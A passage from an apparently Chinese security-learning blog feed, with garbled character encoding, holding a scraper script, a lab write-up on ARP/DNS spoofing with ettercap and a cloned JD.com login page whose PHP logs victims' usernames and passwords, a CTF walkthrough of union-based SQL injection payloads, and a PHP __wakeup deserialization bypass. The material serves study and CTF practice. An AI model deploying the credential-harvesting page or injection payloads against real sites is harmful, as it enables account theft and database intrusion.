    <content type="html"><![CDATA[<h1 id="ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡"><a href="#ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡" class="headerlink" title="ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡"></a>ç”¨çˆ¬è™«çˆ¬å–å°å§å§çš„å›¾ç‰‡</h1><a id="more"></a><p><strong>ç”¨çš„åº“</strong></p><div class="hljs"><pre><code class="hljs applescript">re <span class="hljs-comment">#æ­£åˆ™è¡¨è¾¾å¼</span>requests <span class="hljs-comment">#urlè¯·æ±‚</span><span class="hljs-built_in">time</span>   <span class="hljs-comment">#æ—¶é—´</span>os     <span class="hljs-comment">#ç”¨äºåˆ›å»ºæ–‡ä»¶å¤¹ï¼Œä¿å­˜å›¾ç‰‡</span></code></pre></div><p>##å‡†å¤‡å·¥ä½œ<br>1.é¦–å…ˆè®¿é—®è¯¥é“¾æ¥<br><code>https://www.vmgirls.com/</code><br>2.éšä¾¿ç‚¹å‡»ä¸€ä¸ªè¿›å…¥æŸ¥çœ‹è¯¦æƒ…<br><code>https://www.vmgirls.com/13344.html</code><br>3.F12å®¡æŸ¥å…ƒç´ ç½‘æŸ¥çœ‹é¡µè¯¦æƒ…ï¼Œä¸»è¦æŸ¥çœ‹å›¾ç‰‡é“¾æ¥çš„æ ‡ç­¾ä½ç½®ï¼Œå†™å‡ºæ­£åˆ™è¡¨è¾¾å¼<br><img src="https://i.loli.net/2020/12/04/49X1BbloChqFsic.png" srcset="/img/loading.gif" alt="1"><br>è¯¥æ­£åˆ™è¡¨è¾¾å¼ä¸º<code>findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39;</code></p><h2 id="å®Œæ•´ç¨‹åº"><a href="#å®Œæ•´ç¨‹åº" class="headerlink" title="å®Œæ•´ç¨‹åº"></a>å®Œæ•´ç¨‹åº</h2><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span><span class="hljs-comment">#@Time : 2020/7/16 13:36</span><span class="hljs-comment">#@Author : sunzy</span><span class="hljs-comment">#@File : tupian.py</span><span class="hljs-keyword">import</span> re<span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> osdir = <span class="hljs-string">"plmm"</span>        <span class="hljs-comment">#æ–‡ä»¶å¤¹åå­—</span><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):   <span class="hljs-comment">#é¦–å…ˆåˆ¤æ–­æ˜¯å¦å­˜åœ¨å½“å‰æ–‡ä»¶å¤¹å¦‚æœæ²¡æœ‰åˆ™åˆ›å»ºä¸€ä¸ª</span>    os.mkdir(dir)<span class="hljs-comment"># æ¨¡ä»¿æµè§ˆå™¨çš„é¦–éƒ¨ä¿¡æ¯ï¼Œç»•è¿‡ä¸€äº›ç½‘ç«™çš„åçˆ¬å–æªæ–½</span>head = &#123;        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>    &#125;url = <span class="hljs-string">"https://www.vmgirls.com/13344.html"</span>response = requests.get(url, headers = head)   <span class="hljs-comment"># è®¿é—®ç›®æ ‡ç½‘é¡µï¼Œè·å–ç½‘é¡µå†…å®¹</span>html = response.textfindlinks = <span class="hljs-string">'&lt;a href="(.*?)" alt=".*?" title=".*?"&gt;'</span>urls = re.findall(findlinks, html)   <span class="hljs-comment">#çˆ¬å–åˆ°çš„å›¾ç‰‡é“¾æ¥ä¿å­˜åœ¨urlsä¸­ï¼Œ æ˜¯ä¸€ä¸ªåˆ—è¡¨</span><span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment">#é˜²æ­¢è®¿é—®é€Ÿåº¦è¿‡å¿«ä½¿æœåŠ¡å™¨å´©æºƒ</span>    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]    <span class="hljs-comment">#ä¿å­˜å›¾ç‰‡çš„åå­—</span>    res = requests.get(url, headers = head)   <span class="hljs-comment">#ä¾æ­¤è®¿é—®å›¾ç‰‡é“¾æ¥</span>    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:   <span class="hljs-comment">#ä»¥äºŒè¿›åˆ¶å½¢å¼ä¿å­˜å›¾ç‰‡</span>        f.write(res.content)</code></pre></div>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>çˆ¬è™«</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>diaoyu</title>
    <link href="/2020/07/18/diaoyu/"/>
    <url>/2020/07/18/diaoyu/</url>
    
    <content type="html"><![CDATA[<h1 id="DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ"><a href="#DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ" class="headerlink" title="DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ"></a>DNSæ¬ºéª—ã€ARPæ”»å‡»åŠé’“é±¼ç½‘ç«™åˆ¶ä½œ</h1><a id="more"></a><p>1.å®éªŒç›®çš„<br>è·å–ç™»å½•jdç½‘é¡µçš„ç”¨æˆ·åå’Œå¯†ç <br>2.å®éªŒä¸»æœº<br>ä¸€å°kali,ä¸¤å°win2003,å…¶ä¸­ä¸€å°ä¸ºå®¢æˆ·æœºï¼Œä¸€å°ä¸ºæœåŠ¡å™¨ï¼Œkaliä½œä¸ºæ”»å‡»è€…<br>3.å®éªŒææ–™<br>äº¬ä¸œç™»å½•ç½‘é¡µåŠå…¶æ‰€æœ‰å›¾ç‰‡ï¼ˆæµè§ˆå™¨è®¿é—®<a href="https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F" target="_blank" rel="noopener">https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F</a> ä¹‹åä¿å­˜ç½‘é¡µå³å¯ï¼‰<br><img src="https://i.loli.net/2020/11/30/LOSJIsP4luKBQxA.png" srcset="/img/loading.gif" alt><br>ä¿®æ”¹index.htmlä¸­çš„å†…å®¹<br><img src="https://i.loli.net/2020/11/30/jyiqQNSlnEt43XL.png" srcset="/img/loading.gif" alt><br>error.phpä¸­çš„å†…å®¹å¦‚ä¸‹<br>å…³é”®ä»£ç ï¼ˆç”¨äºä¿å­˜ç”¨æˆ·åå’Œå¯†ç ä»¥åŠè¿·æƒ‘ç”¨æˆ·ï¼‰</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$nam = stripslashes($_POST[<span class="hljs-string">'name'</span>]); <span class="hljs-comment">//name æ˜¯ç”±ç½‘é¡µçš„è¡¨å•ä¿¡æ¯å†³å®šï¼Œä¸åŒçš„ç½‘é¡µå¯¹åº”ä¸åŒçš„å†…å®¹ï¼Œè¿™ä¸€ç‚¹å¾ˆé‡è¦</span>$pas = stripslashes($_POST[<span class="hljs-string">'pass'</span>]);<span class="hljs-comment">//passä¹Ÿä¸€æ ·</span>$content = <span class="hljs-string">"æ‚¨å·²æ•è·äº¬ä¸œè´¦å·åŠå¯†ç 1ä¸ªï¼š"</span> . <span class="hljs-string">" ç”¨æˆ·å "</span> . $nam . <span class="hljs-string">" å¯†ç  "</span> . $pas;   <span class="hljs-comment">//ä¿å­˜æ•è·çš„ç”¨æˆ·åå’Œå¯†ç </span>$filed = @fopen(<span class="hljs-string">"1.txt"</span>, <span class="hljs-string">"a+"</span>);   <span class="hljs-comment">//æ‰“å¼€1.txt</span>@fwrite($filed, <span class="hljs-string">"$content\n"</span>);     <span class="hljs-comment">//å°†ç”¨æˆ·åå’Œå¯†ç å†™å…¥1.txt</span><span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;head&gt;&lt;script type=<span class="hljs-string">"text/javascript"</span>&gt;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;window.history.back() <span class="hljs-comment">//åé€€+åˆ·æ–°</span>&#125;&lt;/script&gt;&lt;/head&gt;&lt;body onload=<span class="hljs-string">"goBack()"</span>&gt; &lt;!-- åŠ è½½ä¹‹åç«‹å³æ‰§è¡Œä¸€æ®µ JavaScript --&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><p>4.å®éªŒæ‹“æ‰‘å›¾<br><img src="/2020/07/18/diaoyu/tuopu.png" srcset="/img/loading.gif" alt></p><h2 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h2><h3 id="ä¸€-éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨"><a href="#ä¸€-éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨" class="headerlink" title="ä¸€.éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨"></a>ä¸€.éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨</h3><p>1.å®‰è£…DNSå’ŒwebæœåŠ¡å™¨ï¼ˆå…·ä½“æ­¥éª¤ç•¥ï¼‰<br>2.é…ç½®DNSæœåŠ¡å™¨<br>a.åœ¨æ­£å‘è§£æä¸­å»ºä¸€ä¸ªåŒºåŸŸåå­—ä¸ºjd ipä¸ºæœåŠ¡å™¨åœ°å€ï¼ˆ10.1.1.1ï¼‰<br>b.åœ¨jdåŸŸä¸­æ–°å»ºä¸€å°ä¸»æœº  <a href="http://www.jd.com" target="_blank" rel="noopener">www.jd.com</a>    ip:10.1.1.1</p><p>2.IIS<br>a.å°†é»˜è®¤ç½‘ç«™åœæ­¢<br>b.æ–°å»ºç½‘ç«™jd.com,æ–‡ä»¶è·¯å¾„ä¸ºä¿å­˜çš„jdç½‘é¡µ<br>c.æ‰“å¼€webæœåŠ¡ä¸­çš„aspï¼ˆå› ä¸ºæ­¤ç½‘ç«™ä¸æ˜¯é™æ€ç½‘ç«™ï¼‰<br><img src="https://i.loli.net/2020/11/30/gJ3jo84Zvlp1PLh.png" srcset="/img/loading.gif" alt><br>ï¼ˆä½¿ç”¨2003å®¢æˆ·æœºè®¿é—®<a href="http://www.jd.comçœ‹çœ‹ç½‘ç«™å‘å¸ƒæ˜¯å¦æˆåŠŸï¼‰" target="_blank" rel="noopener">www.jd.comçœ‹çœ‹ç½‘ç«™å‘å¸ƒæ˜¯å¦æˆåŠŸï¼‰</a></p><h3 id="äºŒ-éƒ¨ç½²kali"><a href="#äºŒ-éƒ¨ç½²kali" class="headerlink" title="äºŒ.éƒ¨ç½²kali"></a>äºŒ.éƒ¨ç½²kali</h3><p>1.å°†é’“é±¼ç½‘é¡µçš„æ‰€æœ‰æ–‡ä»¶æ”¾åˆ° kali çš„/var/www/html/è·¯å¾„ä¸‹ï¼Œ å¹¶ä¿®æ”¹ 1.txt çš„æƒé™ï¼Œ ä½¿è¿™ä¸ªæ–‡æ¡£å¯ä»¥å†™å…¥æ•°æ®ã€‚<br><img src="https://i.loli.net/2020/11/30/JVq4XPL85nHChi6.png" srcset="/img/loading.gif" alt><br>2.å¼€å¯apacheæœåŠ¡ï¼Œå¹¶æ£€æŸ¥80ç«¯å£æ˜¯å¦å·²å¼€å¯<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="https://i.loli.net/2020/11/30/h76CQJgyL3VMka8.png" srcset="/img/loading.gif" alt><br>3.ä¿®æ”¹DNSæ¬ºéª—é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨ vim ç¼–è¾‘å™¨ï¼Œ å‘½ä»¤ï¼švim /etc/ettercap/etter.dnsï¼Œç„¶å æ·»åŠ ä¸€æ¡ A è®°å½•ï¼Œ<br>æ·»åŠ ä¸€æ¡ PTR è®°å½•ï¼Œä½¿ç”¨æˆ·è®¿é—®<a href="http://www.jd.comï¼ŒæŒ‡å‘ä¸º10.1.1.2" target="_blank" rel="noopener">www.jd.comï¼ŒæŒ‡å‘ä¸º10.1.1.2</a><br>  <img src="https://i.loli.net/2020/11/30/oAzX9aDBfH2qRMu.png" srcset="/img/loading.gif" alt><br><code>é€‰ä¸­ä¸€è¡Œåï¼ŒæŒ‰ä¸¤æ¬¡då¯åˆ é™¤å†…å®¹</code><br><code>æƒ³è¦ç¼–è¾‘æ—¶ï¼Œå…ˆæŒ‰i(insert)</code><br><code>ç¼–è¾‘ç»“æŸå  :wq ä¿å­˜</code><br>4.æ‰“å¼€ettercapè½¯ä»¶<br>5.é€‰æ‹©sniffâ€“unified sniffingï¼Œå¹¶é€‰æ‹©ç›‘å¬eth0<br>6.ç„¶åé€‰æ‹©Hostsâ€”â€”Scan for hostsâ€“æ‰«æå®Œæˆåé€‰æ‹©Hostsâ€”â€”Hosts list,å¯ä»¥çœ‹åˆ°æ‰«æåˆ°çš„ä¸»æœº<br>7.æ·»åŠ æ¬ºéª—è®°å½•<br>é€‰ä¸­10.1.1.1ï¼Œç‚¹å‡»Add to Target 1 é€‰ä¸­10.1.1.3ï¼Œç‚¹å‡»Add to Target 2<br>8.åœ¨Mitmé€‰æ‹©ARPæ¬ºéª—<br><img src="https://i.loli.net/2020/11/30/yPgL23A1kcTfFED.png" srcset="/img/loading.gif" alt><br>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå‹¾é€‰ç¬¬ä¸€ä¸ªç‚¹å‡»ç¡®å®š<br><img src="/2020/07/18/diaoyu/6.png" srcset="/img/loading.gif" alt><br>9.é€‰æ‹©plugins â€“ Manage the pluginsï¼Œå‡†å¤‡è¿›è¡ŒDNSæ¬ºéª—<br>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œ æ‰¾åˆ° dns spoof å¹¶åŒå‡»å‡ºç°*å·ï¼Œå¼€å§‹DNSæ¬ºéª—</p><h3 id="ä¸‰-ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢"><a href="#ä¸‰-ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢" class="headerlink" title="ä¸‰.ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢"></a>ä¸‰.ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢</h3><p>1.åœ¨å®¢æˆ·æœºä¸­åœ¨ä¸­ï¼Œå†æ¬¡ç™»å½•<a href="http://www.jd.comè¾“å…¥ç”¨æˆ·åå¯†ç ç„¶åç‚¹å‡»ç™»å½•" target="_blank" rel="noopener">www.jd.comè¾“å…¥ç”¨æˆ·åå¯†ç ç„¶åç‚¹å‡»ç™»å½•</a></p><p>2.åœ¨kaliè™šæ‹Ÿæœºä¸­ï¼Œå·²ç»é’“é±¼æˆåŠŸï¼Œå¹¶é’“åˆ°äº¬ä¸œçš„ç™»å½•è´¦æˆ·åŠå¯†ç (cat 1.txt)<br><img src="https://i.loli.net/2020/11/30/OFsx34ZUAGBI9CP.png" srcset="/img/loading.gif" alt></p>]]></content>
    
    
    <categories>
      
      <category>æ¼æ´</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>guestbook</title>
    <link href="/2020/04/18/Guestbook/"/>
    <url>/2020/04/18/Guestbook/</url>
    
    <content type="html"><![CDATA[<h1 id="guestbook"><a href="#guestbook" class="headerlink" title="guestbook"></a><a href="https://hackme.inndy.tw/gb/?mod=new" target="_blank" rel="noopener">guestbook</a></h1><a id="more"></a><p>é¢˜ç›®æç¤ºï¼š<strong>This guestbook sucks. sqlmap is your friend.</strong> æ˜¯sqlæ³¨å…¥<br>ç‚¹å‡»Message List æ—¶æ˜¯ç©ºçš„ï¼Œ ç‚¹å‡»postæ˜¯å¯ä»¥æäº¤æ–°ä¿¡æ¯ï¼Œç‚¹å‡»æŸ¥çœ‹æ–°ä¿¡æ¯</p><p>åœ¨idå€¼ååŠ ä¸Šâ€ â€˜ â€œæµ‹è¯•æ˜¯å¦å­˜åœ¨æµ‹è¯•ç‚¹ç½‘é¡µæŠ¥é”™è¯´æ˜å­˜åœ¨æ³¨å…¥ç‚¹<br>union æ³¨å…¥!<br>æŸ¥çœ‹åˆ—</p><div class="hljs"><pre><code class="hljs perl">https:<span class="hljs-regexp">//hackme</span>.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=-<span class="hljs-number">1</span>%20union%20select%201,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>%20<span class="hljs-comment">#</span>//id=-<span class="hljs-number">1</span> æ˜¯è®©å‰é¢çš„å†…å®¹ä¸æ˜¾ç¤º</code></pre></div><p>3è¢«å›æ˜¾</p><p>1.æŸ¥çœ‹æ•°æ®åº“å</p><div class="hljs"><pre><code class="hljs perl">https:<span class="hljs-regexp">//hackme</span>.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=-<span class="hljs-number">1</span>%20union%20select%201,<span class="hljs-number">2</span>,database(),<span class="hljs-number">4</span>%20<span class="hljs-comment">#</span></code></pre></div><p>æ•°æ®åº“çš„åå­—<code>g8</code></p><p>2.æŸ¥çœ‹è¡¨å</p><div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div><p>å‘ç°æœ‰ä¸€ä¸ªè¡¨ <code>flag</code></p><p>3.æµ‹è¯•è¡¨çš„å­—æ®µ</p><div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'flag'</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div><p>ä»ç„¶æ˜¾ç¤º<code>flag</code></p><p>4.è¯»å–flag   </p><div class="hljs"><pre><code class="hljs pgsql">https://hackme.inndy.tw/gb/?mod=<span class="hljs-keyword">read</span>&amp;id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> flag <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>#</code></pre></div><p>å¾—åˆ°flag!</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sqlæ³¨å…¥</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ååºåˆ—åŒ–</title>
    <link href="/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/03/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>ååºåˆ—åŒ–</p><a id="more"></a><p>PHPé­”æœ¯æ–¹æ³•_ wakeup()æ˜¯åœ¨ååºåˆ—åŒ–æ“ä½œä¸­èµ·ä½œç”¨çš„é­”æ³•å‡½æ•°ï¼Œ å½“unserializeçš„æ—¶å€™ï¼Œ ä¼šæ£€æŸ¥æ—¶å€™å­˜åœ¨ __ wakeup()å‡½æ•°, å¦‚æœå­˜åœ¨çš„è¯ï¼Œä¼šä¼˜å…ˆè°ƒç”¨__wakeup()å‡½æ•°ã€‚ </p><p>è€Œ<strong>wakeup()å‡½æ•°æ¼æ´å°±æ˜¯ä¸å¯¹è±¡çš„å±æ€§ä¸ªæ•°æœ‰å…³ï¼Œå¦‚æœåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå±æ€§ä¸ªæ•°çš„æ•°å­—ä¸çœŸå®å±æ€§ä¸ªæ•°ä¸€è‡´ï¼Œé‚£ä¹ˆå°±è°ƒç”¨</strong>wakeup()å‡½æ•°, å¦‚æœè¯¥æ•°å­—å¤§äºçœŸå®å±æ€§ä¸ªæ•°ï¼Œå°±ä¼šç»•è¿‡__wakeup()å‡½æ•°ã€‚</p><p>serialize()å‡½æ•°ï¼šç”¨äºåºåˆ—åŒ–å¯¹è±¡æˆ–æ•°ç»„ï¼Œå¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åºåˆ—åŒ–å¯¹è±¡åï¼Œ å¯ä»¥å¾ˆæ–¹ä¾¿çš„å°†å®ƒä¼ é€’ç»™å…¶ä»–éœ€è¦å®ƒçš„åœ°æ–¹ï¼Œä¸”å…¶ç±»å‹å’Œç»“æ„ä¸ä¼šæ”¹å˜ã€‚</p><p>unserialize()å‡½æ•°ï¼šç”¨äºå°†é€šè¿‡serialize()å‡½æ•°åºåˆ—åŒ–åçš„å¯¹è±¡æˆ–æ•°ç»„è¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶è¿”å›åŸå§‹çš„å¯¹è±¡ç»“æ„ã€‚</p><p>ä¸¾ä¾‹è¯´æ˜</p><div class="hljs"><pre><code>&lt;?phpclass Student{public $full_name = &apos;zhangsan&apos;;public $score = 150;public $grades = array();function __wakeup() {echo &quot;__wakeup is invoked&quot;;}}$s = new Student();var_dump(serialize($s));?&gt;</code></pre></div><hr><div class="hljs"><pre><code>O:7:&quot;Student&quot;:3:{s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:{}}</code></pre></div><p>å„ä¸ªç¬¦å·çš„å«ä¹‰<br><strong>å˜é‡ç±»å‹ï¼šç±»åé•¿åº¦ï¼ˆå­—èŠ‚ï¼‰ï¼šç±»åï¼šå±æ€§æ•°é‡ï¼š{å±æ€§åç±»å‹ï¼šå±æ€§åé•¿åº¦ï¼šå±æ€§åï¼šå±æ€§å€¼ç±»å‹ï¼šå±æ€§å€¼é•¿åº¦ï¼šå±æ€§å€¼å†…å®¹}</strong></p><p>å…¶ä¸­åœ¨Stuedentç±»åé¢æœ‰ä¸€ä¸ªæ•°å­—3ï¼Œæ•´ä¸ª3è¡¨ç¤ºçš„å°±æ˜¯Studentç±»å­˜åœ¨3ä¸ªå±æ€§ã€‚<br>wakeup()æ¼æ´å°±æ˜¯ä¸æ•´ä¸ªå±æ€§ä¸ªæ•°å€¼æœ‰å…³ã€‚<strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œã€‚</strong></p><p>å½“æˆ‘ä»¬å°†ä¸Šè¿°çš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å¯¹è±¡å±æ€§ä¸ªæ•°ä¿®æ”¹ä¸º5ï¼Œå˜ä¸º<br>O:7:â€Studentâ€:5:{s:9:â€full_nameâ€;s:8:â€zhangsanâ€;s:5:â€scoreâ€;i:150;s:6:â€gradesâ€;a:0:{}}</p><p>æœ€åæ‰§è¡Œè¿è¡Œçš„ä»£ç å¦‚ä¸‹:</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Student</span></span>&#123;<span class="hljs-keyword">public</span> $full_name = <span class="hljs-string">'zhangsan'</span>;<span class="hljs-keyword">public</span> $score = <span class="hljs-number">150</span>;<span class="hljs-keyword">public</span> $grades = <span class="hljs-keyword">array</span>();<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span> </span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"__wakeup is invoked"</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>&#123;var_dump(<span class="hljs-keyword">$this</span>);&#125;&#125;$s = <span class="hljs-keyword">new</span> Student();$stu = unserialize(<span class="hljs-string">'O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125;'</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><h2 id="ä¸¾ä¾‹è¯´æ˜"><a href="#ä¸¾ä¾‹è¯´æ˜" class="headerlink" title="ä¸¾ä¾‹è¯´æ˜"></a>ä¸¾ä¾‹è¯´æ˜</h2><p>é¢˜ç›®</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;<span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);&#125;?code=</code></pre></div><hr><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xctf</span></span>&#123;  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªåä¸ºxctfçš„ç±»</span><span class="hljs-keyword">public</span> $flag = <span class="hljs-string">'111'</span>;<span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»å±æ€§$flagï¼Œå€¼ä¸º111</span><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-comment">//å®šä¹‰ä¸€ä¸ªå…¬æœ‰çš„ç±»æ–¹æ³•__wakeup()ï¼Œè¾“å‡ºbad requestsåé€€å‡ºå½“å‰è„šæœ¬</span><span class="hljs-keyword">exit</span>(<span class="hljs-string">'bad requests'</span>);&#125;&#125;$test = <span class="hljs-keyword">new</span> xctf();   <span class="hljs-comment">//ä½¿ç”¨newè¿ç®—ç¬¦æ¥å®ä¾‹åŒ–è¯¥ç±»ï¼ˆxctfï¼‰çš„å¯¹è±¡ä¸ºtest</span><span class="hljs-keyword">echo</span>(serialize($test));   <span class="hljs-comment">//è¾“å‡ºè¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼ˆtestï¼‰</span><span class="hljs-meta">?&gt;</span></code></pre></div><p>è¾“å‡ºç»“æœ</p><div class="hljs"><pre><code>O:4:&quot;xctf&quot;:1:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>æˆ‘ä»¬è¦ååºåˆ—åŒ–xctfç±»çš„åŒæ—¶è¿˜è¦ç»•è¿‡wakeupæ–¹æ³•çš„æ‰§è¡Œï¼ˆå¦‚æœä¸ç»•è¿‡wakeup()æ–¹æ³•ï¼Œé‚£ä¹ˆå°†ä¼šè¾“å‡ºbad requestså¹¶é€€å‡ºè„šæœ¬ï¼‰ï¼Œwakeup()å‡½æ•°æ¼æ´åŸç†ï¼šå½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®ä¸ªæ•°çš„å±æ€§æ—¶å°±ä¼šè·³è¿‡wakeupçš„æ‰§è¡Œã€‚å› æ­¤ï¼Œéœ€è¦ä¿®æ”¹åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­çš„å±æ€§ä¸ªæ•°ï¼š<br>å½“æˆ‘ä»¬å°†ä¸Šè¿°çš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ä¸­çš„å¯¹è±¡å±æ€§ä¸ªæ•°ç”±çœŸå®å€¼1ä¿®æ”¹ä¸º2ï¼Œå³å¦‚ä¸‹æ‰€ç¤ºï¼š</p><div class="hljs"><pre><code>O:4:&quot;xctf&quot;:2:{s:4:&quot;flag&quot;;s:3:&quot;111&quot;;}</code></pre></div><p>è®¿é—®url?code=O:4:â€xctfâ€:2:{s:4:â€flagâ€;s:3:â€111â€;}</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>unserialize</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è¿·å®«é—®é¢˜</title>
    <link href="/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/"/>
    <url>/2020/03/20/%E8%BF%B7%E5%AE%AB%E9%97%AE%E9%A2%98/</url>
    
